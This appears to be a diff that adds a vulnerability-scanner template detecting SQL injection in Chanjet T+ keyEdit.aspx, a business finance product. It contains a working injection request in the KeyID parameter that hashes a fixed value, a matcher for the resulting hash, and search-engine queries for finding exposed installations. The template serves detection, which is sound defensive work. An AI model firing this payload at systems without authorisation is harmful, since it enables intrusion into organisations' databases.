@@ -1,0 +1,27 @@
+id: changjet-tplus-keyedit-sqli
+
+info:
+  name: 畅捷通 T+ keyEdit.aspx - SQL 注入漏洞
+  author: leadlife
+  severity: high
+  description: 畅捷通 T+ keyEdit.aspx 存在SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库权限。畅捷通 T+ 是一款基于互联网的新型企业管理软件，功能模块包括：财务管理、采购管理、库存管理等，主要针对中小型工贸和商贸企业的财务业务一体化应用。
+  reference:
+    - https://blog.csdn.net/qq_39894062/article/details/138564705
+    - https://blog.csdn.net/weixin_41924764/article/details/139729111
+  metadata:
+    verified: true
+    hunter-query: app.name="畅捷通 T+"
+    fofa-query: icon_hash="-2067519629" || app="畅捷通-TPlus"
+  tags: sqli, tplus, enterprise,changjet
+
+http:
+  - raw:
+      - |
+        GET /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(SELECT+sys.fn_varbintohexstr(hashbytes('MD5'%2C'999999999')))%20--&preload=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "c8c605999f3d8352d7bb792cf3fdb25"
